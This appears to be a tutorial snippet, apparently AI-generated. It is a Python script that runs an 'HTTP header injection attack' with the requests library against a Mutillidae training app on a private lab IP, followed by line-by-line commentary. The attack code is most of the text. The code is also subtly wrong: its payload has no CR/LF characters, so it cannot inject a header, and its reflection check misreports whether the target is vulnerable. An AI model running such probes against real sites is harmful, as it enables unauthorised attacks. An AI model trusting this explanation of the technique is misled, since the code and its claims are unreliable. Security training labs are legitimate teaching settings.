
# Here's another example that demonstrates how to perform a simple HTTP header injection attack using Python's `requests` library:

# Simple HTTP Header Injection Attack

import requests

def perform_header_injection(url, vulnerable_header):
    # Injected header value
    header_value = "Attacker's Header: Malicious Content"

    # Construct the headers dictionary with the injected header
    headers = {vulnerable_header: header_value}

    try:
        # Send a GET request with the injected header
        response = requests.get(url, headers=headers)

        # Check if the injected header is reflected in the response headers
        if header_value in response.headers.values():
            print("HTTP Header Injection successful! The application is vulnerable.")
        else:
            print("HTTP Header Injection unsuccessful. The application is likely secure.")

    except requests.exceptions.RequestException as e:
        print(f"HTTP request failed: {e}")

def main():
    # URL of the vulnerable web application
    vulnerable_url = "http://192.168.124.216/mutillidae/index.php?page=home.php"

    # Name of the vulnerable header (e.g., "User-Agent", "Referer", etc.)
    vulnerable_header = "User-Agent"

    print("Performing HTTP Header Injection Attack...")
    perform_header_injection(vulnerable_url, vulnerable_header)

if __name__ == "__main__":
    main()

# We define a function `perform_header_injection()` that takes the URL of a vulnerable web application and the name of a vulnerable header as input.
# We construct a header dictionary with the injected header and its value.
# We send a GET request to the target URL with the injected header using the `requests.get()` function.
# We check if the injected header is reflected in the response headers. If it is, we print a message indicating a successful injection. Otherwise, we print an appropriate error message.
# In the `main()` function, we specify the URL of the vulnerable web application and the vulnerable header, and then call the `perform_header_injection()` function to execute the attack.
